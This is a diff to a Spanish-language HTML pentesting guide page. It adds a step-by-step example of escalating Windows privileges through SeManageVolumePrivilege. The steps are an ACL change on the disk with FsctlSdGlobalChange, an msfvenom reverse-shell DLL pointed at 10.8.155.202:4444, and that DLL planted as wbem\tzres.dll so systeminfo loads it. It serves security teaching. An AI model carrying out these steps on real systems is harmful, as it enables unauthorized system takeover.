@@ -12,8 +12,44 @@ herramientas de limpieza de discos. Hay que tener especial cuidado con este perm
 <p class="mainText">
 Hay varias aproximaciones que se pueden utilizar para conseguir elevar privilegios a partir de esta directiva, un ejemplo sería hacerse con el control del 
 directorio raíz “C:\” y por ejemplo crear una librería maliciosa situándola en System32 y de esa forma realizar un DLL Hijacking sencillo a un servicio que 
-se esté ejecutando con un nivel de integridad alto. 
-<a class="linksref" target="_blank" href="https://github.com/xct/SeManageVolumeAbuse">
+se esté ejecutando con un nivel de integridad alto. Para realizar el cambio de permisos utilizaremos FsctlSdGlobalChange.c 
+<a class="linksref" target="_blank" href="https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c">
     <i class="bi bi-box-arrow-up-right"></i>
-</a>
+</a>.
 </p>
+
+
+
+<!-- 
+    ---------------------------- EJEMPLO ------------------------------------------------
+-->
+
+<h2 class="h_ejemplo"><i class="bi bi-bug-fill me-2"></i></i>EJEMPLO</h2>
+<p>
+    Comprobamos que efectivamente tenemos el permiso de <b>seManageVolumePrivilege</b>.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/users/manageVol_1.png" />
+<p>
+    Ejecutamos el binario <b>FsctlSdGlobalChange.exe</b> que sobrescrive el SID de Administradores por el de Usuarios comunes.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/users/manageVol_2.png" />
+<p>
+    Podemos comprobar ahora que tenemos permisos totales en directorios como system32 con <b>icacls</b>
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/users/manageVol_3.png" />
+<p>
+    Vamos ahora a crear una shell reversa en una dll con msfvenom para hacer un <b>DllHijacking</b> con un código como el siguiente.
+</p>
+<!-- Code snipet-->
+<pre class="code_snipet"><code data-language="shell">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.155.202 LPORT=4444 -f dll -o rev.dll
+</code></pre>
+</div>
+<!-- Code-->
+<p>
+    Ahora lo ponemos en <i>C:\Windows\System32\wbem\tzres.dll</i> para hacer un DllHijacking al comando <b>Systeminfo</b>.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/users/manageVol_4.png" />
+<p>
+    Inmediatamente después de llamar a systeminfo obtenemos la conexión reversa con NT AUTHORITY\NETWORK SERVICE
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/users/manageVol_5.png" />
